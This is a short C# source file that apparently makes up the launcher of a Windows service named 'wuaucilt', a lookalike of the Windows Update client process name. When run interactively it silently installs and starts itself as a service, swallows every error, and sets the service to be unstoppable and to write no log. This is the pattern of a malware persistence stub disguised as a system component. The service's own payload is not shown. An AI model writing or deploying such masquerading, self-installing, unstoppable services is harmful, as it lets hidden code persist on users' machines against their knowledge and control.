using System;
using System.Collections.Generic;
using System.ServiceProcess;
using System.Text;
using System.Configuration.Install;
using System.Reflection;
using System.ComponentModel;
using System.Collections;

namespace wuaucilt
{
    class Program : ServiceBase
    {
        static void Main(string[] args)
        {
            if (System.Environment.UserInteractive)
            {
                ManagedInstallerClass.InstallHelper(new string[] { Assembly.GetExecutingAssembly().Location });
                ServiceController service = new ServiceController("wuaucilt");
                try
                {
                    TimeSpan timeout = TimeSpan.FromMilliseconds(3000);

                    service.Start();
                    service.WaitForStatus(ServiceControllerStatus.Running, timeout);
                }
                catch
                { }
            }
            else
            {
                ServiceBase.Run(new Service1());
            }
        }

        private void InitializeComponent()
        {
            this.AutoLog = false;
            this.CanStop = false;
        }
    }
}
